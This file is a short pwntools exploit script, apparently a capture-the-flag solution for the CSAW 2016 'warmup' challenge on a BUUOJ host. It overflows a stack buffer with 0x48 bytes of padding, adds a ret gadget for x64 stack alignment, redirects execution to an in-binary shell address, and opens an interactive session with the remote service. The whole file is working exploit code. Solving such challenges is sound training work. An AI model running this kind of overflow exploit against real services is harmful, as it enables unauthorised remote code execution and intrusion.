#Made by fly_autumn
#ret2text x64
from pwn import *
p = remote("node5.buuoj.cn",27790)#p = process("./warmup_csaw_2016")
offset = 0x40 + 8
shell_addr = 0x40060d
ret_addr = 0x4004a1
payload = b"\x00"*offset + p64(ret_addr) + p64(shell_addr)
p.sendline(payload)
p.interactive()
